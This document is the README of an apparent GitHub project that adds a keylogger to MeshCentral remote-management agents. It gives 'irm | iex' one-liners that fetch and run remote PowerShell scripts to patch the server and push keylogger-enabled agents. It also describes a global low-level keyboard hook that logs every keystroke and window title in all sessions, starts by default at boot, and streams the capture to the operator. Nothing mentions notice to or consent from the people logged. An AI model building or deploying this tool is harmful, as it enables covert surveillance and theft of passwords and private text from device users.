# MeshCentral Keylogger (`mckeylog`)

A keylogger for [MeshCentral](https://github.com/Ylianst/MeshCentral), built the same
way the MeshCentral Audio project is: a native C module compiled into MeshAgent plus
a MeshCentral plugin that adds a first-class **Keylogs** tab to every device page.

- **Live keystrokes** stream into the tab while you watch.
- **Previous keylogs**: the agent always writes rolling local log files; the tab
  lists them and can view or download any of them.
- No third-party dependencies; plain JSON over the authenticated agent relay
  (tunnel protocol **17**).

## Install

Two one-liners, in this order. Open PowerShell **as administrator** on the server:

```powershell
powershell -c "irm https://raw.githubusercontent.com/og-debug447/meshcentral-keylogger/main/install-keylogger.ps1 | iex"
```

Patches the MeshCentral server (relay rights check, tunnel dispatch, device page
templates) and drops the plugin files into `meshcentral-data\plugins\mckeylog`.
Backups are kept in `meshcentral-data\mckeylog-backups\<timestamp>`.

```powershell
powershell -c "irm https://raw.githubusercontent.com/og-debug447/meshcentral-keylogger/main/install-keylogger-agent.ps1 | iex"
```

Publishes the keylogger-enabled `MeshService.exe` (x86) and `MeshService64.exe`
(x64) into `meshcentral-data\signedagents\` so Agent Update/Reinstall picks them
up. ARM64 agents are left alone.

Then:

1. **Admin console → Plugins** → *Install* → paste the plugin URL:
   `https://raw.githubusercontent.com/og-debug447/meshcentral-keylogger/main/config.json`
2. **Hard-refresh the browser (Ctrl+F5).**
3. On each device, open **PC Control → agent menu → Agent Update** (or reinstall
   the agent). After the agent restarts it starts logging automatically.
4. Open a device → the **Keylogs** tab (next to *Plugins*) shows live keys and
   the list of previous `keylog-*.log` files with **View** / **Download**.

## What the Keylogs tab does

- **Connect / Disconnect** — opens the authenticated tunnel (protocol 17) to the
  agent. Auto-reconnects a few times if the link drops while the tab is open.
- **Start Logging / Stop Logging** — toggles the native keylogger remotely
  (the agent auto-starts it at boot, so logging is on by default).
- **Refresh Files** — re-lists the agent's `keylog-*.log` files.
- **Live pane** — the last 2000 keystrokes, one per line:
  `YYYY-MM-DD HH:MM:SS.mmm  <char or [Name]>  <modifiers>  <window title>`
- **Previous keylog files** — View (first ~512 KB inline) or Download (full
  file) via 64 KB chunks.

## How it works

- `agent/ILibDuktape_Keylogger.c` — native Windows keylogger. A
  `WH_KEYBOARD_LL` hook on a dedicated thread captures keydown events (auto-repeat
  skipped), resolves the character with `ToUnicodeEx`, records modifiers and the
  foreground window (with an `EnumWindows` fallback so service-session agents can
  see interactive windows). Lines go to a 4096×384 in-memory ring and to rolling
  `keylog-YYYY-MM-DD.log` files (10 MB default, rotates to `-1`/`-2`; 1 MB–256 MB
  configurable) next to the agent executable.
- `modules_meshcore/win-keylogger.js` — agent side of the tunnel: `tail`
  (live stream, 250 ms drain with backpressure), `start`, `stop`, `state`,
  `list`, `read`, `unsub`.
- `plugin/mckeylog-viewmode.js` — browser controller for the tab, copied to
  `public/scripts/mckeylog-viewmode.js` by the patcher.
- `scripts/patch_meshcentral.js` — idempotent server patch (meshrelay rights,
  meshcore dispatch, both device page templates, page 61).
- `scripts/patch_meshagent.js` — idempotent MeshAgent source patch (C module,
  ScriptContainer init, vcxproj/makefile entries).

See `docs/architecture.md` for the full design.

## Building the agent binaries

From a MeshAgent checkout with Visual Studio 2022 (v143) or newer:

```powershell
node scripts/patch_meshagent.js <path-to-MeshAgent>
msbuild <path-to-MeshAgent>\meshservice\MeshService-2022.vcxproj /p:Configuration=Release /p:Platform=x64
msbuild <path-to-MeshAgent>\meshservice\MeshService-2022.vcxproj /p:Configuration=Release /p:Platform=Win32
```

Outputs: `meshservice\Release\MeshService64.exe` and `meshservice\Release\MeshService.exe`.
Replace the files in `binaries/` and push, then re-run the agent installer.

## Notes

- Logging is on by default after agent start; Stop Logging pauses capture but the
  previous files remain on the agent.
- Keystrokes are captured in all sessions (global low-level hook), so the agent
  works whether it runs as a service or in a user session.
- Non-Windows agents get a stub that reports "not available" — the tab still
  works, it just shows the status message.
- The keylogger only sees key-down events from the keyboard (injected keys are
  included, as is normal for low-level hooks).
